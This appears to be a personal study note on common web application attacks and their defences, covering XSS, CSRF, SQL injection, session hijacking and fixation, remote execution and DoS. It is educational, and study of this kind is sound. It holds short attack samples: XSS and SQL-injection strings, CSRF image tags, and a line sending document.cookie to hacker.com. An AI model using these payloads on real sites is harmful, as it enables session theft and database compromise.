================================================================================
 The most common attacks
================================================================================

* [Cross-site scripting](#-cross-site-scripting)
* [Cross-site request forgery](#-cross-site-request-forgery)
* [SQL injection](#-sql-injection)
* [URL manipulation](#-url-manipulation)
* [Faked requests](#-faked-requests)
* [Faked forms](#-faked-forms)
* [Cookie visibility and theft](#-cookie-visibility-and-theft)
* [Session hijacking](#-session-hijacking)
* [Session fixation](#-session-fixation)
* [Remote system execution](#-remote-system-execution)
* [File upload abuse](#-file-upload-abuse)
* [Denial of service ](#-denial-of-service)

The Big Three: XSS, CSRF, SQL injection. 

Manage them first!

--------------------------------------------------------------------------------
 Cross-site scripting
--------------------------------------------------------------------------------

"XSS"

= Inject JS into a web page 

Used to
  * trick users into running JS code
  * steal cookies, including session data

"Cross-site" because scripting is done via another website.

Successful because:

  * Broswser doesn't have mechanism for knowing which JS is trustworthy

  * Browser is allowed to access cookie data via JS `document.cookie`

```
GET /register.php?email=kevin@gmail.com

HTML output:
Email: <%= email %> 

Email: kevin@gmail.com  
```

Attack - email adress is a script:

```
GET /register.php?email=<script>alert("Gotcha!");</script>

Email: <%= email %>

Email: <script>alert("Gotcha!");</script>
```

**Sanitize**

  * **any dynamic text that gets output to browser** - HTML, JS, JSON, XML, etc.

  * cookie, session data, **especially data from URLs or forms**

  * **database data**
    * Being stored doesn't mean it can be trusted

```
<script>
  var user_list = <%= @users.to_json %>;
</script>

// Prematurely truncate JSON, insert script and comment out everyting after...
// database data:
email = "fake@email.com\"; alert('Gotcha!'); //"
```

If HTML must be allowed (CMS)

  * Whitelist the allowed HTML tags

  * Sanitize everything else

--------------------------------------------------------------------------------
 Cross-site request forgery
--------------------------------------------------------------------------------

"CSRF"

= Trick users into making a request to your server

Used for

  * fraudulent clicks - e.g. hacker is payed based on page views

  * taking advantage of a user's logged in state

case 1: *Setting up online poll*

  * "Who is the smartest hacker?"

  * `https://poll.com/vote?hacker=5674` = vote for Pedro

  * Pedro includes that link in a comment to a blog post:
    `<img src="https://poll.com/vote?hacker=5674">`

  * Browser sends request to URL. Since users are logged in, they vote for Pedro.

case 2: *Fraudulent money transaction*

  * You log in to your online banking account

  * You close browser window, but don't log out. Session with bank is still open.

  * You open a blog with code in comments inserted by hacker:
    `<img src="https://bank.com/transfer?amount=1000&to=987654321">`

Defense

  * **GET should be idempotent**    
      * = calling it repeatedly makes no additional changes 
      * 'play' and 'stop' '- idempotent
      * 'pause' - toggles state - not idempotent

  * **Only use POST for making changes**
      * '<img>' are always GET
      * it is possible to issue POST without web form, but very hard for someone
        else

  * **Create smart web forms** - custom forms

      * = ensure that request comes from forms, generated recently by our server 
          for a particular user 

      1. *Store a "form token" in user's session* - hash
      2. *Add a hidden field to forms, with form token as value*
           * When form is delivered, it has the same value as the user's session
      3. *Compare the two* - session form token vs. submitted form token

      * if form is copied to another client, it won't work
      * **Store the *token generation time* in user's session**
        * e.g. make it expire after 1day

--------------------------------------------------------------------------------
 SQL injection
--------------------------------------------------------------------------------

= execute arbitrary SQL requests

Used to
  
  * probe database schema
    * Trial and error looking for valid SQL

  * *steal* database data
    * Usernames, passwords, credit cards, encrypted data

  * *add or change* database data
    * Place orders
    * Assign elevated privileges

  * *destroy* database data
    * Truncate or drop tables

Dynamically generated SQL:

```sql
SELECT * FROM users
WHERE username = '${username}' AND password = '${password}';

username = "jsmith
password = "secret"

SELECT * FROM  users
WHERE username = 'jsmith' AND password = 'secret';
```

Attack

```sql
SELECT * FROM users
WHERE username = '${username}' AND password = '${password}';

username = "jsmith' OR 1 = 1; --"
password = "blank"

SELECT * FROM  users
WHERE username = 'jsmith' OR 1 = 1; --' AND password = 'blank';
```

Defense

  * **Give limited privileges to application's database user**

      * allow: read and write

      * deny:  create and drop tables, truncate tables, grant access privileges

  * **Sanitize input**

      * Escape for SQL - most programming languages have library

      * `\'` instead of `'`

OR better alternative

  * **Prepared Statements**

      * query is not a string, it is a program or function with inputs so we can't 
        manufacture a bad string

  ```sql
  -- setting up the SQL program... ? = input
  SET @sql = "SELECT * FROM articles WHERE title = ?";

  PREPARE stmt FROM @sql;    -- prepare statement from string

  EXECUTE stmt USING @query; -- execute statement with our @query
  ```

--------------------------------------------------------------------------------
 URL manipulation
--------------------------------------------------------------------------------

= Editing the URL string to probe the site

Simple, but still dangerous.

Used for

  * revealing private information

  * performing restricted actions

Attack
```
http://site.com?invoice=A-17391

http://site.com/authorize?UserID=9876543210

http://site.com?SESSIONID=AG8B3190CFAF48231A55E

http://site.com/products?preview=false
```

Defense

  * **Realize that URLs are exposed and editable**
      * If there are no links from other pages, pages are still accessible via 
        "deep links" by guessing

  * Don't use obscurity for access control  (nejasnoća, nepoznatost)
      * **strictly enforce usernames and passwords for access control**

  * **Keep error messages vague**

  * Clarify GET and POST requests

      * **GET  - idempotent (no changes)**

      * **POST - used for making changes**

      * ensures no changes can be made via URL

      * GET might still allow hackers to see information they shouldn't see

--------------------------------------------------------------------------------
 Faked requests
--------------------------------------------------------------------------------

= Request header information CAN be modified - "faked" or "spoofed" header
  (spoof = ometati, prevariti)

By default it is generated by the browser.

Ways to modify header

  * browser plugins and tools

  * advanced command line tools 

  * can be part of a script - hacker can try hundreds of variations

Defense? None. 
**Just be aware header information can't be trusted while designing other 
security measures.**

--------------------------------------------------------------------------------
 Faked forms
--------------------------------------------------------------------------------

= HTML forms can be duplicated  

view source  >  copy form  >  create another page
 >  have it submit modified form with same action 

Defense:

  * **Do not rely on form structure for data validation**
      * especially hidden fields

  * **Do not rely on client-side data validations with JS**

  * **Use HTTP Referer to enforce same-domain forms**
     * remember, headers can be faked... good practice nevertheless

  * **Use CSRF protections (token, timestamp)**

--------------------------------------------------------------------------------
 Cookie visibility and theft
--------------------------------------------------------------------------------

= cookie data is visible to users

= cookies can be stolen using XSS attack 
``` 'http://hacker.com?steal=' + document.cookie ```

= cookies can be sniffed by observing network traffic 
  * from request headers

Defense:

  * **Only put non-sensitive data in cookies** - e.g. language preference

  * **Use *HttpOnly* header attribute**

     * = expose cookies only over HTTP/HTTPS

      * makes cookies unavailable to JS 'document.cookie' - prevents XSS

  * **Use *Secure* header attribute** over HTTPS

      * = use cookies only over secure/encrypted connections

      * e.g. hacker can send request over HTTP

--------------------------------------------------------------------------------
 Session hijacking
--------------------------------------------------------------------------------

Similar to cookie theft but much more valuable.

Session vs. cookie

  * We store sensitive information on the server and send browser a cookie with 
    a session ID to reference that information.

  * Information is safer because it is never sent to the browser.
 
Used to 

  * assume your identity and logged in status

  * steal personal info, change password

Often done by network eavesdropping

  * Very easy on open wireless networks at coffe shops! Download software 
    and voila

Defense    

* Save 'user agent' string in session and confirm it 

  * e.g. if user logs in with a certain version of Firefox, then expect all 
    future requests to also be from Firefox - if not, prompt to log-in again

  * header can be modified, so it's **weak**

* Check IP adress

  * expect all requests to be from same IP as log-in - if not, prompt to log-in 
    again

  * **buggy**
    * IP of legitimate users may change if they move between APs or cellphone 
      towers
    * multiple computers sharing the same IP adress - corporate, coffe shops...

---

####better

* **HttpOnly cookies**

* **Regenerate session identifier periodically, at key points**

    * Especially important **after log in**

* **Expire/remove old session files regularly**

    * Keep track of last activity in session and expire sessions without any 
      recent 

    * e.g. 'last updated' time of a file or record in a dbs

---

####BEST

**SSL with Secure cookies**

  * log in and all transactions are over SSL

  * small performance penalty 

--------------------------------------------------------------------------------
 Session fixation
--------------------------------------------------------------------------------

= Trick a user into using a hacker-provided session ID - instead of stealing it

Used to (same as session hijacking)

  * assume your identity and logged in status

  * steal personal info, change password

Successful if user authenticates a known session identifier

```
GET /login HTTP/1.1
Host: yourbank.com
Cookie: SESSION_ID=3e1234ra4def8aef9472c

// hacker creates a link
http://yourbank.com/login?SESSION_ID=a1b2c3d4e5f6g7h8i9

// user opens it
GET /login HTTP/1.1
Host: yourbank.com
Cookie: SESSION_ID=a1b2c3d4e5f6g7h8i9

// now session is valid and hacker has it's ID
```

Defense

* **Do not accept session identifiers from GET or POST variables, only from
    cookies**

* **Regenerate session identifier periodically, at key points**
    * Especially important **after log in**

* **Expire/remove old session files regularly**

--------------------------------------------------------------------------------
 Remote system execution
--------------------------------------------------------------------------------

= Remotely run operating system commands on a webserver

Used to
  * **anything** your operating system can do

  * add/delete/modify files

  * change access privileges/passwords/IP adress...

**Most powerful hack and hardest to achieve** - unless you make it easy.

Most programming languages:

  * do not allow casual access to the underlying operating system

  * offer special commands which can access the underlying system => TROUBLE

System execution keywords
  * allow language to talk to the underlying OS

  * many are shared across languages

```
system          call
exec            subprocess
shell           spawn
sh              passthru
shell_exec      eval
open            %x
popen           `
proc_open
```

**Avoid system execution keywords**

  * Perform it with extreme caution

  * Sanitize any dynamic data carefully

  * Understand the commands and their syntax completely

  * Add aditional data validations

--------------------------------------------------------------------------------
 File upload abuse
--------------------------------------------------------------------------------

= Abuse of allowed file upload features 

Used to

  * upload too much (quantity, file size)

  * upload malicious files 

Defense: 

  * **Require user authentication, no anonymous uploads**

  * **Limit maximum upload size and give each user a quota**

  * **Limit allowable file formats**

  * **Use caution when opening uploaded file**

  * **Do not host uploaded files which have not been verified**

--------------------------------------------------------------------------------
 Denial of service
--------------------------------------------------------------------------------

"DoS"

= Attempt to make a server unavailable to users

"DDoS" 
  = if performed by distributed network

  * botnets can be rented for a low price

Attacks:

  * overloading a server with requests

  * DNS and routing disruption - users can't get to the site

  * using up disk space, processor power, bandwith

Cheap to launch, difficult to prevent.

Can be used as a distraction from other hacking attempts.

Defense:

  * Firewalls
    * block access to certain ports
    * filter IP addresses of attackers

  * Switches and routers
    * rate limiting
    * filtering features such as access control lists

  * Load management hardware/software
    * balance the load between different servers
    * spin up additional instances of the server in the cloud

  * Implement collection of reverse proxies

  * Map your infrastructure

  * Keep infrastructure up to date

  * Purchase high-quality hosting and equipment

  * Make network traffic visible
    * see in real time traffic that's comming in

  * Develop a response plan

  * Be nice :)

If under attack:

  * Change IP adress
    * attacks often skip DNS and go directly to IP
  
  * "Black hole" or "null route" traffic
    * ignore all incoming traffic
    * allows admin to connect to the server and make changes
    * ISPs do it by themselves, so you should contact them in case of attack


